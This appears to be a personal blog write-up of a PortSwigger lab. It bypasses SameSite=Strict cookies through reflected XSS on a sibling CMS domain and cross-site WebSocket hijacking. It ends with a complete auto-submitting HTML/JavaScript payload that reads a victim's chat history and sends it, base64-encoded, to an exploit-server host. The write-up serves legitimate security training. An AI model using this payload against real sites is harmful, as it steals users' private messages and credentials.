+++
date = '2026-07-06T13:49:16+08:00'
draft = false
title = 'SameSite Strict bypass via sibling domain'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Really interesting labs utilising reflected XSS and WebSocket hijacking. Highly suggest reviewing.'
showLastUpdated = true
+++

At first glance, this is pretty similar to [this problem](/training/portswigger/csrf/csrf-practioner8). We inspect the WebSocket history and find out that whenever we send a `READY` message, all the chat history on that session is returned. So that means the same payload from that problem can be applied right?
![](/images/viber_image_2026-07-06_09-04-41-571.png)
But notice that the session cookie has `SameSite` set to `Strict`, that means every attempt to hijack the WebSocket connection from an outside source will not extract any useful information, besides that same default Connected with Hal Prime message.
![](/images/viber_image_2026-07-06_09-03-41-758.png)
So naturally, we have to find another attack surface to capitalise on. But where? The only other useful functionality on the main site is the login form, which is protected by the same Strict session cookie. However, CSRF protections like tokens are not present, can we take advantage of this?
![](/images/viber_image_2026-07-06_09-30-47-118.png)

The main site has no other useful endpoints, so we have to start looking elsewhere. After digging through the site map, we should find files that have a peculiar `Access-Control-Allow-Origin` header. Since setting a `SameSite=Strict` cookie can be severely limiting (for example backend API calls), this header lists domains that are allowed to read the data from the main domain:
![](/images/viber_image_2026-07-06_09-26-11-297.png)
Here, the only domain allowed is an exposed CMS. So we access this endpoint and are greeted with another login form, with another Strict session cookie:
![](/images/viber_image_2026-07-06_09-30-09-149.png)
Let's test this. Try inserting `test` and `test` into the two fields and see what happens:
![](/images/viber_image_2026-07-06_09-40-54-305.png)
As you can see, our invalid name attempt is reflected inside the HTML. This is a huge reflected XSS flag, but the possibility of a WAF or filters is there. Let's try inserting a simple `h1` to see what sticks:
![](/images/viber_image_2026-07-06_09-53-55-840.png)
Surprisingly, our payload is indeed reflected! We can probably assume that no block is in effect and that we can freely inject JS script inside the form.

With the CMS being allowed to fetch data from the main site, and the fact that we can inject JS freely, it's time to craft our final payload:
```html
<form id="xssForm" action="https://cms-<lab-id>.web-security-academy.net/login" method="POST">
    <input type="hidden" name="username" value="<script>
        var ws = new WebSocket('wss://<lab-id>.web-security-academy.net/chat');
        
        ws.onopen = function() {
            ws.send('READY');
        };
        
        ws.onmessage = function(event) {
            fetch('https://<exploit-server>/exploit?data=' + btoa(event.data));
        };
    </script>">
    
    <input type="hidden" name="password" value="test">
</form>

<script>
    document.getElementById('xssForm').submit();
</script>
```
This is the same as [the last problem](/training/portswigger/csrf/csrf-practioner8), this time the CMS will do our bidding and fetch all the juicy chat history from the victim, all while still adhering to the `SameSite=Strict` rule.

After sending the payload to our victim, the log will be updated with the full chat history of the victim, credentials included:
![](/images/viber_image_2026-07-06_10-00-39-067.png)
![](/images/viber_image_2026-07-06_10-01-16-776.png)

This goes to show how we should manage carefully every surface, whether it's frontend or backend, visible or not visible to normal users.